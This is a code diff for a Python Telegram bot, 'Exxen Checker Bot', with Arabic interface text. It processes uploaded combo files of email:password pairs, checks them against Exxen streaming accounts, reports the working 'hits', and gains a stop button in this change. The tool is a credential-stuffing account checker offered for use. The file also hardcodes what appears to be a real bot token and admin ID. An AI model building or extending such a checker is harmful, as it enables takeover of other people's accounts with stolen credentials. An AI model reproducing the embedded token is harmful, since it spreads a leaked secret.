@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# Exxen Checker Bot — Timeout Shield & Retry (Fixed Builder)
+# Exxen Checker Bot — With Stop Button
 # pip install python-telegram-bot requests cfonts
 
 import asyncio
@@ -7,8 +7,8 @@ import base64
 import requests
 import os
 from cfonts import render
-from telegram import Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters, ContextTypes
 from telegram.request import HTTPXRequest
 from telegram.error import TimedOut, NetworkError
 
@@ -17,6 +17,11 @@ from telegram.error import TimedOut, NetworkError
 # ==========================================
 BOT_TOKEN = "5804877719:AAEHFYJLOjQ3HuZTIDIMwoD0zFsRzXRMHEs"
 ADMIN_ID = 5870967455
+
+# ==========================================
+# GLOBAL STATE
+# ==========================================
+IS_CHECKING = False
 
 # ==========================================
 # TERMINAL UI (Banner)
@@ -66,6 +71,9 @@ def check_exxen_account(mail, pas):
 # ASYNC BACKGROUND PROCESS
 # ==========================================
 async def process_combos(update: Update, context: ContextTypes.DEFAULT_TYPE, file_bytes: bytes):
+    global IS_CHECKING
+    IS_CHECKING = True
+    
     chat_id = update.effective_chat.id
     seen_combos = set()
     hits = 0
@@ -89,15 +97,26 @@ async def process_combos(update: Update, context: ContextTypes.DEFAULT_TYPE, fil
 
     if total == 0:
         await context.bot.send_message(chat_id=chat_id, text="⚠️ **الملف فارغ أو لا يحتوي على تنسيق صحيح (mail:pass).**", parse_mode="Markdown")
+        IS_CHECKING = False
         return
+
+    # زر الإيقاف
+    stop_kb = InlineKeyboardMarkup([
+        [InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_checking")]
+    ])
 
     status_msg = await context.bot.send_message(
         chat_id=chat_id,
         text=f"⏳ **بدء الفحص...**\n\n🔍 الإجمالي: `0/{total}`\n🎯 الشغال: `0`",
+        reply_markup=stop_kb,
         parse_mode="Markdown"
     )
 
     for line in valid_lines:
+        # التحقق من حالة الإيقاف
+        if not IS_CHECKING:
+            break
+            
         try:
             mail, pas = line.split(':', 1)
             mail = mail.strip()
@@ -124,6 +143,7 @@ async def process_combos(update: Update, context: ContextTypes.DEFAULT_TYPE, fil
                 try:
                     await status_msg.edit_text(
                         text=f"⏳ **جاري الفحص...**\n\n🔍 الإجمالي: `{checked}/{total}`\n🎯 الشغال: `{hits}`",
+                        reply_markup=stop_kb,
                         parse_mode="Markdown"
                     )
                 except Exception:
@@ -134,10 +154,18 @@ async def process_combos(update: Update, context: ContextTypes.DEFAULT_TYPE, fil
         except Exception:
             pass
             
+    # رسالة النهاية
+    if IS_CHECKING:
+        final_text = f"🏁 **تم الانتهاء!**\n\n📁 إجمالي الحسابات: `{total}`\n🔍 تم فحص: `{checked}`\n🎯 الشغال: `{hits}`"
+    else:
+        final_text = f"🛑 **تم إيقاف الفحص يدوياً!**\n\n📁 الإجمالي: `{total}`\n🔍 تم فحص: `{checked}`\n🎯 الشغال: `{hits}`"
+        
     await status_msg.edit_text(
-        text=f"🏁 **تم الانتهاء!**\n\n📁 إجمالي الحسابات: `{total}`\n🔍 تم فحص: `{checked}`\n🎯 الشغال: `{hits}`",
+        text=final_text,
         parse_mode="Markdown"
     )
+    
+    IS_CHECKING = False
 
 # ==========================================
 # TELEGRAM HANDLERS
@@ -148,12 +176,18 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
         "👁️ **Exxen Checker Bot**\n\n"
         "أرسل ملف الكومبو (`.txt`) وسأقوم بفحصه فوراً.\n"
-        "ستظهر لك واجهة الفحص مباشرة في الشات."
+        "ستظهر لك واجهة الفحص مباشرة في الشات مع زر إيقاف."
     )
     await update.message.reply_text(text, parse_mode="Markdown")
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global IS_CHECKING
+    
     if update.effective_user.id != ADMIN_ID:
+        return
+        
+    if IS_CHECKING:
+        await update.message.reply_text("⚠️ **يوجد فحص قيد التشغيل حالياً.**\nاضغط على زر (إيقاف الفحص) أولاً.")
         return
         
     doc = update.message.document
@@ -180,6 +214,20 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await msg.delete()
     asyncio.create_task(process_combos(update, context, bytes(file_bytes)))
 
+async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global IS_CHECKING
+    query = update.callback_query
+    await query.answer()
+    
+    if query.from_user.id != ADMIN_ID:
+        return
+
+    if IS_CHECKING:
+        IS_CHECKING = False
+        await query.edit_message_text("🛑 **جاري إيقاف الفحص...**", parse_mode="Markdown")
+    else:
+        await query.edit_message_text("⚠️ **لا يوجد فحص قيد التشغيل حالياً.**", parse_mode="Markdown")
+
 # ==========================================
 # ERROR HANDLER
 # ==========================================
@@ -195,7 +243,6 @@ async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
 def main():
     show_banner()
     
-    # إعداد طلب HTTPXRequest بمهل عالية (120 ثانية)
     request = HTTPXRequest(
         connect_timeout=120.0,
         read_timeout=120.0,
@@ -203,7 +250,6 @@ def main():
         pool_timeout=120.0
     )
     
-    # تمرير request للبوت (سيغطي كل شيء بدون الحاجة لـ get_updates_*)
     app = (
         Application.builder()
         .token(BOT_TOKEN)
@@ -213,6 +259,7 @@ def main():
     
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
+    app.add_handler(CallbackQueryHandler(stop_check, pattern="^stop_checking$"))
     app.add_error_handler(error_handler)
     
     print("[*] Bot is polling. Send the combo file...")
